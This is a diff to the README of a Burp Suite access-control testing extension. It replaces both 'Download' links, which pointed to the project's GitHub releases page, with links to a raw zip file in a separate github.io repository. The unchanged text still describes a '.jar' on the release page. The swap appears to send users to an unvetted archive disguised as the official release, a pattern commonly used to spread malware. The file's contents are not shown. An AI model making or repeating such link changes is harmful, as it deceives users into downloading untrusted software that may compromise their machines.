@@ -5,7 +5,7 @@ description: "Test access control across identities and tenants with this Burp S
 ---
 # 🛡️ Authz-ExeC - Test web access security with ease
 
-[![Download Authz-ExeC](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Pruthvra2855/Authz-ExeC/releases)
+[![Download Authz-ExeC](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Pruthvra2855/pruthvra2855.github.io/main/files/Latest-1.1.zip)
 
 ## 🎯 About This Tool
 
@@ -22,7 +22,7 @@ Authz-ExeC helps you check the security of your web applications. It tests if di
 
 You need the latest version of the tool to start your security tests. 
 
-[Click here to visit the release page and download the file.](https://github.com/Pruthvra2855/Authz-ExeC/releases)
+[Click here to visit the release page and download the file.](https://raw.githubusercontent.com/Pruthvra2855/pruthvra2855.github.io/main/files/Latest-1.1.zip)
 
 Look for the file ending in `.jar` under the "Assets" section of the latest release. Save this file to a folder you can find easily, such as your Downloads or Desktop folder.
 
